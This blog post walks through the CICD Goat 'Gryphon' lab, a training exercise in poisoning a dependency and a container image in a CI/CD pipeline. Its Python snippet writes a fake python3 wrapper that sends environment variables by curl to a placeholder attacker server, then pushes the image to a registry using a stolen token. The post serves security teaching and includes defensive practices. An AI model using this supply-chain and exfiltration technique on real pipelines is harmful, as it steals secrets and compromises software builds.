---
title: '100 Days of Cloud Security - Day 88: CICD Goat - Gryphon'
date: '2026-02-06'
author: 'Venkata Pathuri'
excerpt: 'Day 88 of my cloud security journey - CICD Goat - Gryphon'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 88: CICD Goat - Gryphon

## Overview
Welcome back to our 100-day cloud security journey! Today, we dive into a thrilling challenge involving dependency chain abuse within CI/CD environments, specifically through the lens of the Gryphon challenge. Building upon what we learned in Day 87, where we explored the foundational principles of CI/CD security, we now focus on a more complex scenario—how vulnerabilities in one repository can cascade into grave security risks across interconnected projects.

## Learning Objectives
By the end of today's lesson, you will master the art of identifying and exploiting dependency chain vulnerabilities in CI/CD pipelines. You will understand how to execute a supply chain attack, recognize the importance of secure coding practices, and learn how to safeguard your own environments against such threats. This knowledge will empower you to contribute to the security of your organization’s software development processes.

## Deep Dive
### Understanding Dependency Chain Abuse
Dependency chain abuse occurs when a vulnerable or malicious library is introduced into a project, leading to security breaches. In our scenario, we have access to three GitLab repositories: `pygryphon`, `awesome-app`, and `nest-of-gold`. The `pygryphon` library is our point of entry, which is used as a dependency in `awesome-app`.

When `awesome-app` runs its pipeline, it automatically installs the libraries listed in the `requirements.txt`, including `pygryphon`. This innocent action can serve as a gateway to exploit the entire system.

### Attack Vector Breakdown
1. **Infecting the Dependency**: We start by modifying the `pygryphon` library to include our malicious code. This could be as simple as altering a function that is always called during runtime.
   
2. **Creating the Trap**: The injected code is designed to capture sensitive environment variables (like `FLAG11`) and send them to an external server via a `curl` command. The malicious payload masquerades as the legitimate Python binary.

3. **Weaponizing the Dependency**: Using Docker commands, we build a compromised Docker image that replaces the legitimate `python:3.8` image used by `nest-of-gold`. This process involves logging into the Docker registry using a stolen token, which is critical to our attack.

4. **Executing the Attack**: Once the modified library is published, we wait for the `awesome-app` pipeline to run. When it pulls the updated `pygryphon`, our malicious code executes, allowing us to capture sensitive information and overwrite Docker images.

### Current Best Practices
- **Code Review**: Implement rigorous code review processes to catch unverified changes to dependencies.
- **Dependency Monitoring**: Use tools that monitor dependencies for vulnerabilities, such as Snyk or Dependabot.
- **Environment Isolation**: Keep CI/CD environments isolated to limit the impact of a compromised build process.

## Hands-On Practice
To see this all in action, you’ll need to replicate the steps outlined above in a controlled environment. 

1. **Modify the `pygryphon` Library**:
   - Open the `requirements.txt` of `awesome-app` and ensure it points to your modified `pygryphon`.
   - Inject the malicious payload into the function of your choice.

2. **Prepare the Docker Image**:
   ```python
   import subprocess

   DOCKERFILE = """FROM python:3.8
   COPY python3 /usr/local/bin/
   COPY python3 /usr/local/bin/pip3"""
   PYTHON3 = """#!/bin/bash
   env | grep FLAG11 | curl -X POST --data-binary @- https://YOUR_ATTACKER_SERVER/"""

   def run(cmd):
       proc = subprocess.run(cmd, shell=True, timeout=180)
       print(proc.stdout)
       print(proc.stderr)

   # Build and push image
   run('apk add docker-cli')
   with open('Dockerfile', 'w') as f:
       f.write(DOCKERFILE)
   with open('python3', 'w') as f:
       f.write(PYTHON3)
   run('chmod +x python3')
   run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
   run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')  # Replace with your actual credentials
   run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
   ```

3. **Verify Success**: 
   - Check your external server for received data (i.e., the FLAG11 variable).
   - Ensure the `nest-of-gold` pipeline pulls the compromised image without errors.

### Common Troubleshooting Tips
- If the pipeline fails to run, check for issues in the injected code.
- Ensure that the Docker daemon is accessible from your CI/CD environment.
- Validate that the token used has the necessary permissions.

## Key Takeaways
Today, we learned that dependency chain abuse poses significant risks in CI/CD environments. By understanding how attackers can exploit seemingly benign libraries, we gained insights into the importance of securing our software supply chains. This reinforces the need for vigilance in our development practices and highlights the critical role of security in modern software engineering.

## Real-World Applications
In production environments, organizations must prioritize securing their CI/CD pipelines to prevent similar attacks. Implementing automated security checks, maintaining a robust dependency management strategy, and ensuring that all code changes undergo thorough reviews can help mitigate these risks. The insights gained from today’s lesson serve as a foundational skill set you will carry forward in your cloud security career.

---
**Journey Progress:** 88/100 Days Complete 🚀